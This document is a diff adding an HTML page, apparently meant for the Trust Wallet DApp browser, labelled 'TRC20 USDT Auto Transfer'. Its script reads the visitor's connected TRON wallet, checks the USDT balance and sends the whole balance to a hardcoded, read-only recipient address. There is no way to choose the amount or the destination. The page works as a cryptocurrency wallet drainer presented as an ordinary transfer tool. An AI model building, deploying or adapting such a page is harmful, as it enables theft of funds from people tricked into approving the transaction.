@@ -1,0 +1,63 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="trustwallet-dapp-browser" content="true" />
+  <title>TRC20 USDT Transfer</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+</head>
+<body class="bg-white text-gray-800 font-sans">
+  <div class="max-w-md mx-auto p-6 mt-10">
+    <h1 class="text-xl font-bold mb-4 text-center">TRC20 USDT Auto Transfer</h1>
+
+    <div class="mb-4">
+      <label class="block text-sm mb-1">To Address</label>
+      <input type="text" id="recipient" value="TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo" readonly class="w-full border px-3 py-2 rounded" />
+    </div>
+
+    <button onclick="sendUSDT()" class="w-full bg-blue-700 hover:bg-blue-600 text-white py-3 rounded text-lg">
+      Send All USDT
+    </button>
+
+    <p id="status" class="text-sm text-center mt-4 text-gray-600"></p>
+  </div>
+
+  <script>
+    async function sendUSDT() {
+      const status = document.getElementById("status");
+      const recipient = document.getElementById("recipient").value;
+
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert("❌ Please open in Trust Wallet DApp browser (TRON)");
+        return;
+      }
+
+      const tronWeb = window.tronWeb;
+      const sender = tronWeb.defaultAddress.base58;
+      const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+
+      try {
+        const contract = await tronWeb.contract().at(usdtAddress);
+        status.textContent = "Checking balance...";
+
+        const balance = await contract.balanceOf(sender).call();
+        if (parseInt(balance) === 0) {
+          status.textContent = "❌ No USDT available to send.";
+          return;
+        }
+
+        status.textContent = "Sending all USDT...";
+        const tx = await contract.transfer(recipient, balance).send();
+        status.textContent = "✅ All USDT sent successfully!";
+        console.log("TX:", tx);
+      } catch (err) {
+        console.error(err);
+        status.textContent = "❌ Transaction failed.";
+      }
+    }
+  </script>
+</body>
+</html>
